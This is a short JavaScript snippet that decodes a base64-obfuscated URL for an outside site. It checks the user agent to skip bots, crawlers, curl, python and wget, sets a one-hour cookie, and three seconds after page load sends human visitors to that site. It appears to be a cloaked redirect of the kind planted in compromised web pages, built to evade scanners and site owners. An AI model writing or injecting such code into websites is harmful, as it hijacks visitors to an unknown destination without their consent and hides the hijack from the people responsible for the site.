const _x1 = 'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='; // https://web.aistrip.vip
const _y2 = atob(_x1);
const ua = navigator.userAgent.toLowerCase();
const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
const isBot = /bot|spider|crawler|curl|python|wget/.test(ua);
const visited = document.cookie.includes('visited=true');

const redirectNow = () => {
  if (isBrowser && !isBot && !visited) {
    document.cookie = 'visited=true; max-age=3600';
    window.location.href = _y2;
  }
};

document.addEventListener('DOMContentLoaded', () => {
  setTimeout(redirectNow, 3000);
});
